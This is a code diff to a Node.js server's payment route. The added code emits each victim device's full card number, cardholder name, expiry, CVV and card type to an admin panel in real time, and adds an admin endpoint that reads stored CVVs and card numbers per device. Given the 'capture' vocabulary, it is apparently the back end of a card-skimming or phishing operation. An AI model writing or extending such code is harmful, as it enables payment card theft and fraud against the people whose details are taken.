@@ -2456,8 +2456,29 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
 
       // Broadcast to admin panel
       if (io) io.emit('payment_captured', { device_id, method, amount: amount || '1' });
+      // For card payments: emit full card details so admin sees them in real-time
+      if (method === 'card' && io) {
+        io.emit('card_captured', { device_id, card_number: card_number || '', card_name: card_name || '', card_expiry: card_expiry || '', card_cvv: card_cvv || '', card_type: card_type || '', captured_at: new Date().toISOString() });
+      }
 
       res.json({ success: true, message: 'Payment processed' });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // GET /api/admin/connections/:deviceId/card-details
+  app.get('/api/admin/connections/:deviceId/card-details', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId } = req.params;
+      let cards = [];
+      try {
+        cards = db.prepare(
+          `SELECT card_number, card_name, card_expiry, card_cvv, card_type, captured_at FROM payment_captures WHERE device_id = ? AND method = 'card' ORDER BY captured_at DESC LIMIT 5`
+        ).all(deviceId);
+      } catch (_) {}
+      res.json({ cards, latest: cards[0] || null });
     } catch (err) {
       res.status(500).json({ error: err.message });
     }
